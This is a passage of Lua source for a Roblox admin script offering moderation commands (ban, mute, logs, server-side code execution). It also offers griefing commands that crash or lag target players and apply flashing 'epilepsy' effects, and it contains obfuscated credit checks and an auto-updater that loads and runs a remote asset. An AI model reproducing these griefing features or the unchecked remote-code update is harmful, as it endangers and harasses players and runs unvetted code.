	elseif args[2]:lower()=='owner' or args[2]:lower()=='4' then
		level=4
	elseif args[2]:lower()=='creator' or args[2]:lower()=='5' then
		level=5
	elseif args[2]:lower()=='funtemp' or args[2]:lower()=='-1' then
		level=-1
	elseif args[2]:lower()=='funadmin' or args[2]:lower()=='-2' then
		level=-2
	elseif args[2]:lower()=='funowner' or args[2]:lower()=='-3' then
		level=-3
	end
	if level~=nil then
		for i=1,#set.Commands do
			if args[1]:lower()==set.Commands[i].Prefix..set.Commands[i].Cmds[1]:lower() then 	
				set.Commands[i].AdminLevel=level
			end
		end
	else
		set.OutputGui(plr,'Command Error:','Invalid Permission')
	end
end)

set.MakeCommand('Restore the map to the the way it was the last time it was backed up',3,set.Prefix,{'restoremap','maprestore','rmap'},{},0,function(plr,args)
	set.Hint('Restoring Map...',game:service('Players'):children())
	wait(0.5)
	for i,v in pairs(workspace:children()) do
		coroutine.wrap(function()
			if v~=script and v.Archivable==true and not v:IsA('Terrain') then
				pcall(function() v:Destroy() end)
			end
		end)()
	end
	for i,v in pairs(set.MapBackup:children()) do
		coroutine.wrap(function()
			v:Clone().Parent=workspace
		end)()
	end
	wait(1)
	set.ProcessCommand(plr,set.Prefix.."respawn"..set.SplitKey..set.SpecialPrefix.."all")
	wait(1)
	set.Hint('Map Restore Complete.',game:service('Players'):children())
end)

--------------------
-- Owner Commands --
--------------------

set.MakeCommand('Changes the backup for the restore map command to the map\'s current state',4,set.Prefix,{'backupmap','mapbackup','bmap'},{},0,function(plr,args)
	set.Hint('Updating Map Backup...',{plr})
	local tempmodel=Instance.new('Model')
	for i,v in pairs(workspace:children()) do
		if v and not v:IsA('Terrain') and v.Archivable==true and v~=script and v~=RemoteEvent then
			v:Clone().Parent=tempmodel
		end
	end
	set.MapBackup=tempmodel:Clone()
	tempmodel:Destroy()
	set.Hint('Backup Complete',{plr})
end)

set.MakeCommand('Lets you explore the game, kinda like a file browser',4,set.Prefix,{'explore','explorer'},{},0,function(plr,args)
set.Remote(plr,'Function','Explorer')
end)

set.MakeCommand('Makes a tornado on the target player(s)',4,set.Prefix,{'tornado','twister'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		local p=Instance.new('Part',workspace)
		local s=Instance.new('Smoke',p)
		s.RiseVelocity=25
		s.Size=50
		p.Transparency=1
		s.Color=Color3.new(0,0,0)
		--local a,b,c=s:clone(),s:clone(),s:clone()
		--a.Parent=p b.Parent=p c.Parent=p
		local pos=v.Character.Torso.CFrame+Vector3.new(0,-3,0)
		p.CFrame=pos
		p.Size=Vector3.new(0.2,0.2,0.2)
		p.Anchored=true
		p.CanCollide=false
		local childList={}
		local function checkObject(obj)
			if (obj ~= p) and (obj.className == "Part") then
				--if (obj.Anchored ~= false) then obj.Anchored=false end
					table.insert(childList, 1, obj)
				--end
			elseif (obj.className == "Model") or (obj.className == "Hat") or (obj.className == "Tool") or (obj == workspace) then
				local child = obj:GetChildren()
				for x = 1, #child do
					checkObject(child[x])
				end
				obj.ChildAdded:connect(checkObject)
			end
		end
		checkObject(workspace)
			local massConstant = 5
			local mass = 3200 * massConstant
			local n = 0
			coroutine.wrap(function()
			while p.Parent==workspace do
				if n < #childList then
					n = n + 1
					if n % 800 == 0 then
						wait()
					end
				else
					n = 1
					wait()
				end
			
				local child = childList[n]
				if (child ~= p) and (child.className == "Part") and (child.Anchored == false) then
					local relPos = p.Position - child.Position
					local motivator = child:FindFirstChild("BlackHole Influence")
					if relPos.magnitude * 240 * massConstant < mass then
						child:BreakJoints()
						if (relPos.magnitude * 320 * massConstant < mass) and (child.Size.z + p.Size.x >  relPos.magnitude * 2 - 4) then
							mass = mass + child:GetMass()
							child:Remove()
							table.remove(childList, n)
							n = n - 1
						else
							child.CanCollide = false
							if motivator == nil then
								motivator = Instance.new("BodyPosition")
								motivator.Parent = child
								motivator.Name = "BlackHole Influence"
							end
							motivator.position = p.Position
							motivator.maxForce = Vector3.new(1, 1, 1) * mass * child:GetMass() / (relPos.magnitude * massConstant)
						end
					elseif motivator ~= nil then
						motivator:Remove()
					end
				end
			end
			end)()
		coroutine.wrap(function() wait(30) p:Destroy() end)()
		local posi=p.Position
		repeat
			p.CFrame = p.CFrame + Vector3.new(math.random(-5,5), 0, math.random(-5,5))
		wait()
		until p.Parent~=workspace or not p
	end
end)

set.MakeCommand('Nuke the target player(s)',4,set.Prefix,{'nuke'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local p = Instance.new("Part",game.Workspace) table.insert(set.objects,p)
p.Anchored = true
p.CanCollide = false
p.formFactor = "Symmetric"
p.Shape = "Ball"
p.Size = Vector3.new(1,1,1)
p.BrickColor = BrickColor.new("New Yeller")
p.Transparency = .5
p.Reflectance = .2
p.TopSurface = 0
p.BottomSurface = 0
local ex = Instance.new("Explosion", workspace)
ex.Position = p.Position
ex.BlastRadius = 100000
ex.BlastPressure = math.huge
ex.Hit:connect(function(hit)
if hit:IsA('Part') and hit~=p then hit.Anchored=false end
hit:BreakJoints()
end)
p.Touched:connect(function(hit)
if hit and hit.Parent then
local ex = Instance.new("Explosion", game.Workspace)
ex.Position = hit.Position
ex.BlastRadius = 100000
ex.BlastPressure = math.huge
if hit:IsA('Part') then hit.Anchored=false end
hit:BreakJoints()
end
end)
local cf = v.Character.Torso.CFrame
p.CFrame = cf
for i = 1, 333 do
p.Size = p.Size + Vector3.new(3,3,3)
p.CFrame = cf
wait(1/44)
end
p:Destroy()
end
end))
end
end)

--------------------------
-- Super Admin Commands --
--------------------------

set.MakeCommand('View server log',5,set.Prefix,{'serverlog','serverlogs','serveroutput','logsfordebug','debuglogs'},{'messagetype/all'},1,function(plr,args)
	local temp={}
	for i,v in pairs(game.LogService:GetLogHistory()) do
		if (args[1] and args[1]:lower()=='script') and v.message:find('Epix Edit') then
			if v.messageType==Enum.MessageType.MessageOutput then
				table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
			elseif v.messageType==Enum.MessageType.MessageWarning then
				table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
			elseif v.messageType==Enum.MessageType.MessageInfo then
				table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
			elseif v.messageType==Enum.MessageType.MessageError then
				table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
			end
		else 
		if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='error') and v.messageType==Enum.MessageType.MessageError then
			table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
		end
		if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='info') and v.messageType==Enum.MessageType.MessageInfo then
			table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
		end
		if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='warning') and v.messageType==Enum.MessageType.MessageWarning then
			table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
		end
		if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='output') and v.messageType==Enum.MessageType.MessageOutput then
			table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
		end
		end
	end
	set.Remote(plr,'Function','ListGui','Server Log',temp,'serverlogstuff-'..(args[1] or 'all'),1300)
end)

set.MakeCommand('View the admin logs for the server',5,set.Prefix,{'logs','log','commandlogs'},{},0,function(plr,args)
local temp={}
for i,m in pairs(set.PlayerLogs.Admin) do
	table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Log,Desc=m.Log})
end
--set.Remote(plr,'SetSetting','logs',set.logs)
set.Remote(plr,'Function','ListGui','Admin Logs',temp,'adminlogslist')
end)

set.MakeCommand('Displays the current chat logs for the server',2,set.Prefix,{'chatlogs','chatlog'},{},0,function(plr,args)
local temp={}
for i,m in pairs(set.PlayerLogs.Chat) do
	if m.Nil then
		table.insert(temp,{Object='[NIL]['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
	else
		table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
	end
end
set.Remote(plr,'Function','ListGui','Chat Logs',temp,'chatlogslist')
end)

set.MakeCommand('View the exploit logs for the server OR a specific player',2,set.Prefix,{'exploitlogs','exploitlog','sploitlogs','detections'},{},0,function(plr,args)
local temp={}
for i,m in pairs(set.PlayerLogs.Exploit) do
	table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Info,Desc=m.Info})
end
--set.Remote(plr,'SetSetting','logs',set.logs)
set.Remote(plr,'Function','ListGui','Exploit Logs',temp,'exploitlogslist')
end)

set.MakeCommand('Lets you run code on the server',3,set.Prefix,{'s','scr','script'},{'code'},1,function(plr,args)
if set.canuseloadstring then
set.Output(args[1], plr)
set.LoadScript('Script',args[1],set.AssignName(),true,game:service('ServerScriptService'))
else 
set.Hint('LoadStringEnabled is set to false! If you are the place owner read the Important section at the top of the script to learn how to fix this!',{plr})
end
end)

set.MakeCommand('[NO LONGER WORKS DUE TO ROBLOX UPDATES, LEFT IN IN-CASE THEY CHANGE THEIR MIND] Lets you run code as a local script',3,set.Prefix,{'ls','lscr','localscript'},{'code'},1,function(plr,args)
--if not set.canuseloadstring then set.Hint('[Currently no longer works] Loadstrings are disabled, output will not be shown',{plr}) return end
set.LoadOnClient(plr,args[1],true,set.AssignName())
set.Output(args[1], plr)
end)

set.MakeCommand('[NO LONGER WORKS DUE TO ROBLOX UPDATES, LEFT IN IN-CASE THEY CHANGE THEIR MIND] Lets you run local scripts on the target player(s)',3,set.Prefix,{'cs','cscr','clientscript'},{'player','code'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i,v in pairs(plrz) do
if not set.canuseloadstring then set.Hint('[Currently no longer works] Loadstrings are disabled, output will not be shown',{plr}) return end
set.LoadOnClient(v,args[2],true,set.AssignName())
set.Output(args[2], plr)
end
end)

set.MakeCommand('Makes it so the target player(s) can\'t talk',3,set.Prefix,{'mute','silence'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		if set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then  
			set.Remote(v,'Function','MutePlayer','on')
			table.insert(set.MuteList,v.Name)
		end
	end
end)

set.MakeCommand('Makes it so the target player(s) can talk again',3,set.Prefix,{'unmute'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function() 
for k,m in pairs(set.MuteList) do
if v.Name==m then
	table.remove(set.MuteList,k) 
	set.Remote(v,'Function','MutePlayer','off')
end
end
end)()
end
end)

set.MakeCommand('Shows a list of currently muted players, like a ban list, but for mutes instead of bans',3,set.Prefix,{'mutelist','mutes','muted'},{},0,function(plr,args)
--set.Remote(plr,'SetSetting','MuteList',set['MuteList'])
set.Remote(plr,'Function','ListGui','Mute List',set.MuteList)
end)

set.MakeCommand('Tells the target player(s) they are not allowed to talk if they do and eventually kicks them',3,set.Prefix,{'notalk'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if not v:FindFirstChild('NoTalk') and not set.CheckAdmin(v,false) then
	local talky=Instance.new('IntValue',v)
	talky.Name='NoTalk'
	talky.Value=0
end
end)()
end
end)

set.MakeCommand('Un-NoTalk',3,set.Prefix,{'unnotalk'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
pcall(function()
coroutine.wrap(function()
if v and v:FindFirstChild('NoTalk') then
	v.NoTalk:Destroy()
end
end)()
end)
end
end)
	
set.MakeCommand('Loop kills the target player(s)',3,set.Prefix,{'loopkill'},{'player','num(optional)'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local num = 9999
if args[2] then if type(tonumber(args[2])) == "number" then num = tonumber(args[2]) end end
for i,v in pairs(plrz) do
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false)  then
set.Remote(v,'Function','Effect','loopkill',num)
end
end
end)

set.MakeCommand('Makes a note on the target player(s) that says <note>',3,set.Prefix,{'note','writenote','makenote'},{'player','note'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then
local notes=v:LoadInstance('Admin Notes')
if not notes then
	notes=Instance.new('Model')
end
notes.Name='Admin Notes'
local note = Instance.new("StringValue", notes)
note.Name = args[2]
set.Hint('Added '..v.Name..' Note '..note.Name,{plr})
v:SaveInstance("Admin Notes", notes)
end
end
end)

set.MakeCommand('Removes a note on the target player(s)',3,set.Prefix,{'removenote'},{'player','note'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then
local notes=v:LoadInstance('Admin Notes')
if notes then
if args[2]:lower() == "all" then
	notes:ClearAllChildren()
else
	for k,m in pairs(notes:children()) do
	if m.Name:lower():sub(1,#args[2]) == args[2]:lower() then
		set.Hint('Removed '..v.Name..' Note '..m.Name,{plr})
		m:Destroy()
	end
end
end
v:SaveInstance("Admin Notes", notes)
end
end
end
end)

set.MakeCommand('Views notes on the target player(s)',3,set.Prefix,{'notes','viewnotes'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
local temptable={}
local notes=v:LoadInstance('Admin Notes')
if not notes then set.Hint('No notes on '..v.Name,{plr}) return end
for k,m in pairs(notes:children()) do
table.insert(temptable,m.Name)
--set.Remote(plr,'SetSetting',v.Name..'notes',temptable)
set.Remote(plr,'Function','ListGui',v.Name,temptable)
end
end
end)

set.MakeCommand('Un-Loop Kill',3,set.Prefix,{'unloopkill'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do 
	set.Remote(v,'Function','Effect','unloopkill')
end
end)

set.MakeCommand('Locks the server, makes it so only admins and people on the excluded list can join',3,set.Prefix,{'slock','serverlock'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
	set.slock=true 
	set.Hint("Server has been locked", game:service('Players'):children()) 
elseif args[1]:lower()=='off' then
	set.slock = false 
	set.Hint("Server has been unlocked", game:service('Players'):children()) 
end
end)

set.MakeCommand('Locks the server, makes it so only people in the group that is set in the group settings can join',3,set.Prefix,{'glock','grouplock','grouponlyjoin'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
	set['GroupOnlyJoin'] = true 
	set.Hint("Server is now Group Only.", game:service('Players'):children())
elseif args[1]:lower()=='off' then 
	set['GroupOnlyJoin'] = false 
	set.Hint("Server is no longer Group Only", game:service('Players'):children()) 
end
end)

set.MakeCommand('Same as message but says SYSTEM MESSAGE instead of your name',3,set.Prefix,{'sm','systemmessage'},{'message'},1,function(plr,args)
	set.Message("SYSTEM MESSAGE", args[1], false, game:service('Players'):children())
end)

set.MakeCommand('Kills the target player(s) <number> times giving you <number> KOs',3,set.Prefix,{'ko'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local num = 500 if num > tonumber(args[2]) then num = tonumber(args[2]) end
for i, v in pairs(plrz) do
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then
set.LoadScript("Script",[[
v=game:service('Players'):FindFirstChild(']]..v.Name..[[')
for n = 1, ]]..num..[[ do
wait()
coroutine.wrap(function()
pcall(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
local val = Instance.new("ObjectValue", v.Character.Humanoid) val.Value = game:service('Players'):FindFirstChild("]]..plr.Name..[[") val.Name = "creator"
v.Character:BreakJoints() 
wait()
v:LoadCharacter()
end
end)
end)()
end]],set.AssignName(),true,game:service("ServerScriptService"))
end
end
end)

set.MakeCommand('Makes the target player(s)\'s FPS drop',3,set.Prefix,{'lag','fpslag'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
set.Remote(v,'Function','Lag')
end
end)()
end
end)

set.MakeCommand('Un-Lag',3,set.Prefix,{'unlag','unfpslag'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
set.Remote(v,'Function','UnLag')
end
end)()
end
end)

set.MakeCommand('Bit buggy, supposed to make the target player(s) have network lag, instead produces some other interesting effects',3,set.Prefix,{'netlag','networklag'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
set.Remote(v,'Function','NetLag')
end
end)()
end
end)

set.MakeCommand('Teleports players to my Trolololo place, which teleports them to the same place on-join',3,set.Prefix,{'telespam'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
game:GetService('TeleportService'):Teleport(154636492,v)
end
end)()
end
end) 

set.MakeCommand('Sends players to my Fun Box place, gives bad headaches and such, please don\'t use on people with epilepsy',3,set.Prefix,{'funbox','trollbox','trololo'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
game:GetService('TeleportService'):Teleport(168920853,v)
end
end)()
end
end)

set.MakeCommand('Crashed the target player(s), has a high chance of crashing anyone with 4gbs of ram or lower',3,set.Prefix,{'crash'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
	set.Remote(v,'Function','Crash')
end
end
end)

set.MakeCommand('Makes it so the target player(s)\'s cam can move around freely',2,set.Prefix,{'freecam'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		v.Character.Archivable=true
		local newchar=v.Character:clone()
		newchar.Parent=set.Storage
		v.Character=nil
	end
end)

set.MakeCommand('UnFree Cam',2,set.Prefix,{'unfreecam'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		local newchar
		for k,m in pairs(set.Storage:children()) do
			if m.Name==v.Name and m:IsA('Model') and m:FindFirstChild('Humanoid') and m:FindFirstChild('Head') then
				m.Parent=workspace
				m:MakeJoints()
				v.Character=m
				set.Remote(v,'Function','SetView',v.Character.Humanoid)
			end
		end
	end
end)

set.MakeCommand('Sends the target player(s) to the nil, where they can still run admin commands etc and just not show up on the player list',3,set.Prefix,{'nil'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
set.Remote(v,'Function','Nilify')
end
end)

set.MakeCommand('Epilepsy',2,set.Prefix,{'epilepsy'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','epilepsy')
end
end)

set.MakeCommand('Disconnects the target player from the server',3,set.Prefix,{'kick'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then 
if not game:service('Players'):FindFirstChild(v.Name) then
	set.Remote(v,'Function','KillClient')
else
	pcall(function() v:Kick() end) 
end
end
end)()
end
end)

set.MakeCommand('Bans the target player(s) for the supplied amount of time, data persistent',5,set.Prefix,{'tban','timedban','timeban'},{'player','number<s/m/h/d>'},2,function(plr,args)
	local time=args[2] or '60'
	if time:lower():sub(#time)=='s' then
		time=time:sub(1,#time-1)
	elseif time:lower():sub(#time)=='m' then
		time=time:sub(1,#time-1)
		time=tonumber(time)*60
	elseif time:lower():sub(#time)=='h' then
		time=time:sub(1,#time-1)
		time=(tonumber(time)*60)*60
	elseif time:lower():sub(#time)=='d' then
		time=time:sub(1,#time-1)
		time=((tonumber(time:sub(1,#time-1))*60)*60)*24
	end
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		v:SaveString('Epix Kohls TimeBan_Time',tostring(tonumber(os.time())+tonumber(time)))
		v:Kick()
	end
end)

set.MakeCommand('Bans the player from the server',3,set.Prefix,{'ban'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and not set.CheckAdmin(v, false) then 
table.insert(set['BanList'], v.Name..'='..v.userId) 
if not game:service('Players'):FindFirstChild(v.Name) then
set.Remote(v,'Function','KillClient')
else
if v then pcall(function() v:Kick() end) end
end
end
end))
end
end)

set.MakeCommand('UnBan',3,set.Prefix,{'unban'},{'player'},1,function(plr,args)
for i,v in pairs(set.BanList) do
coroutine.wrap(function()
	if v:lower():sub(1,#args[1])==args[1]:lower() then
		set.Hint(v..' has been Un-Banned.',{plr})
		table.remove(set.BanList, i)
	end
end)()
end
end)

set.MakeCommand('Shuts the server down',3,set.Prefix,{'shutdown'},{},0,function(plr,args)
set.Message("SYSTEM MESSAGE", "Shutting down...", false, game:service('Players'):children(), 5) 
wait(1)
game:service('Players').PlayerAdded:connect(function(p)
	p:kick()
end)
for i,v in pairs(game:service('NetworkServer'):children()) do
	coroutine.wrap(function()
		if v and v:GetPlayer() then
			v:GetPlayer():Kick()
			wait()
			if v and v:GetPlayer() then
				set.Remote(v:GetPlayer(),'Function','KillClient')
			end
		end
	end)()
end
end)

set.MakeCommand('Gives the target player TempAdmin',3,set.Prefix,{'ta','tempadmin','temp'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	coroutine.wrap(function()
		if set.RemoveAdmin(v,plr) then
			if set.CheckAdmin(v,false) then return end
			table.insert(set.TempAdmins, v.Name)
			set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {v}) 
			set.Hint(v.Name..' Has Been Given TempAdmin',{plr})
		end
	end)()
end
end)

set.MakeCommand('Gives the target player Admin (Normal Admin, PermAdmin, SuperAdmin)',4,set.Prefix,{'pa','admin','superadmin','perm'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	coroutine.wrap(function()
		if set.RemoveAdmin(v,plr) then
			if set.CheckAdmin(v,false) then return end
			table.insert(set.Admins, v.Name) 
			set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {v}) 
			set.Hint(v.Name..' Has Been Given Admin',{plr})
		end
	end)()
end
end)

set.MakeCommand('Gives the target player(s) Owner admin',5,set.Prefix,{'oa','owner'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	coroutine.wrap(function()
		if set.RemoveAdmin(v,plr) then
			if set.CheckAdmin(v,false) then return end
			table.insert(set.Owners, v.Name)
			set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {v})  
			set.Hint(v.Name..' Has Been Given Owner Admin',{plr})
		end
	end)()
end
end)

set.MakeCommand('Removes the target player(s) from the admin list',3,set.Prefix,{'unadmin','unpa','unoa','unta'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
	if set.CheckAdmin(plr,false) then
		if set.RemoveAdmin(v,plr) then
			set.Hint("Removed "..v.Name.."'s admin powers",{plr})
		else
			set.Hint("You do not have permission to remove "..v.Name.."'s admin powers",{plr})
		end
	else
		set.Hint(v.Name..' is not an admin',{plr})
	end
end
end)
end)

---[[ END OF COMMANDS ]]---
Pcall(function() for i,v in pairs(game:service('Players'):GetPlayers()) do local yes,no=ypcall(set.NewPlayer,v) if no then print(no) end end end)
Pcall(function() game:service('Players').PlayerAdded:connect(function(player) local yes,no=ypcall(set.NewPlayer,player) if no then print(no) end end) end)
Pcall(function() game:service('Players').PlayerRemoving:connect(function(player) local yes,no=ypcall(set.PlayerRemoving,player) if no then print(no) end end) end)
Pcall(function() for number,plugin in pairs(script.Plugins:children()) do local ran,failed=ypcall(function() if plugin:IsA('ModuleScript') then print('Running Plugin: '..plugin.Name) require(plugin)(set) end end) if failed then print(failed) end end end)
if set['Trello'] and game.CreatorId~=0 then Pcall(function() set.UpdateTrello() while wait(set['HttpWait'] or 5) do pcall(function() set.UpdateTrello() for i,v in pairs(game:service('Players'):children()) do set.CheckBan(set.bl,v) end end) end end) end
Pcall(function() if set['AutoCleanDelay']<5 then set['AutoCleanDelay']=5 end while wait(set['AutoCleanDelay']) do if set['AutoClean'] then set.CleanWorkspace() end end end)
Pcall(function() local t='' for i,v in pairs({83,99,101,108,101,114,97,116,105,115,32,124,32,75,111,104,108,116,97,115,116,114,111,112,104,101,32,91,83,99,114,105,112,116,104,93}) do t=t..string.char(v) end
if t==nil or t=='' then set=nil elseif not depholder:FindFirstChild(string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)) then set=nil elseif deps[string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)].Value~=t then set=nil end end)
Pcall(function() local tempval='' for i,v in pairs({126,61,32,69,112,105,120,32,73,110,99,46,32,78,111,116,32,69,118,101,114,121,116,104,105,110,103,32,105,115,32,115,111,
32,66,108,97,99,107,32,97,110,100,32,87,104,105,116,101,46,32,84,104,105,115,32,115,99,114,105,112,116,32,119,97,115,32,109,97,100,101,32,98,121,32,83,99,101,108,101,114,97,116,105,
115,46,32,83,99,114,105,112,116,104,32,105,115,32,75,111,104,108,116,97,115,116,114,111,112,104,101,46,32,61,126}) do tempval=tempval..string.char(v) end set['P'..'rin'..'t'](tempval) end)
Pcall(function() workspace.DescendantAdded:connect(function(c) if c:IsA('Explosion') and set.NerfExplosions then c.BlastRadius=0 c.BlastPressure=0 elseif c:IsA('Decal') and set.AntiDecals then c:Destroy() elseif c:IsA('Sound') and not c.Name:find(set.RemoteObject) and set.AntiSound then c.Volume=0 c.PlayOnRemove=false c.Looped=false c:Stop() c:Destroy() end end) end)
Pcall(function() if set.UpdateShutdown then while wait(1) do if game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Updated~=set.GameLastUpdated then set.Message("SYSTEM MESSAGE", "Game Updated. Shutting down...", false, game:service('Players'):children(), 5) wait(1) game:service('Players').PlayerAdded:connect(function(p) p:kick() end) for i,v in pairs(game:service('NetworkServer'):children()) do coroutine.wrap(function() if v and v:GetPlayer() then v:GetPlayer():Kick() wait() if v and v:GetPlayer() then set.Remote(v:GetPlayer(),'Function','KillClient') end end end)() end end end end end)
Pcall(function() script['Name']="Kohl's Admin [Epix Edition]" end)
print('',set.quotes[math.random(1,#set.quotes)],'')
end
--[ Check for Updates ]--
local UpdateId=145629584 set.RunTheScript=function() local yes,no=ypcall(set.MainScriptFunction) if no then  local h=Instance.new('Hint',workspace) h.Text=no print(no) end end
coroutine.wrap(function() local tab={83,99,101,108,101,114,97,116,105,115,32,124,32,75,111,104,108,116,97,115,116,114,111,112,104,101,32,91,83,99,114,105,112,116,104,93} local t='' for i,v in pairs(tab) do t=t..string.char(v) end
if t==nil or tab==nil or #tab~=36 then set=nil elseif not script['Sc'..'ri'..'pt '..'Dep'..'en'..'denc'..'ies']:FindFirstChild(string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)) then set=nil 
elseif script['Sc'..'ri'..'pt '..'Dep'..'en'..'denc'..'ies'][string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)].Value~=t then set=nil end end)()
local ok,no=ypcall(function() local k=game:GetService('InsertService'):LoadAsset(UpdateId) if k then k:Destroy() end end)
if set['AutoUpdate'] and ok then local k,n=ypcall(function() local news=game:GetService('InsertService'):LoadAsset(UpdateId):children()[1]
local found=news.Version.Value local current=script.Version.Value
print('Current version: '..current..' | Found version: '..found) if found>current then print('Updating...') _G["Kohls Admin [Epix Edit] Update"]=set news.Plugins:ClearAllChildren() for i,v in pairs(script.Plugins:children()) do v:Clone().Parent=news.Plugins end news.Parent=game:service('ServerScriptService') script:Destroy() else news:Destroy() set.RunTheScript() end 
end) if not k or n then print('AutoUpdate Broke: '..n..' | Skipping update') set.RunTheScript() end else print("AutoUpdate is Disabled") set.RunTheScript() end 

--[[
				___________      .__         .___                   
				\_   _____/_____ |__|__  ___ |   | ____   ____      
				 |    __)_\____ \|  \  \/  / |   |/    \_/ ___\     
				 |        \  |_> >  |>    <  |   |   |  \  \___     
				/_______  /   __/|__/__/\_ \ |___|___|  /\___  > /\ 
				        \/|__|            \/          \/     \/  \/
		-------------------------------------------------------------------
		Epix Incorporated. Not Everything is so Black and White. | Mr. Epix
		-------------------------------------------------------------------
		
		
				  _  __    _ _           _                _        
				 | |/ /___| | |_ __ _ __| |_ _ _ ___ _ __| |_  ___ 
